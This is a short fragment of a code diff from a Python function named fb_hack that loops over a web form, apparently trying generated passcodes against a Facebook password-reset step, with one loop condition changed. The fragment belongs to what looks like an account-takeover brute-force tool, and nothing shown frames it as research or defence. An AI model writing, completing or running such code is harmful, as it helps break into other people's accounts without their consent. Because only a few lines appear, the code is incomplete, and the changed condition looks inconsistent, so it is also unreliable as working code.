@@ -158,7 +158,7 @@ def fb_hack(email, codex):
         sleep(30)
       else:
         print(s.join(success))
-  elif check2 == check4:
+  elif check2 != test:
     while check2 == check4:
       browser.select_form(nr=0)
       y = passcode8(reset)
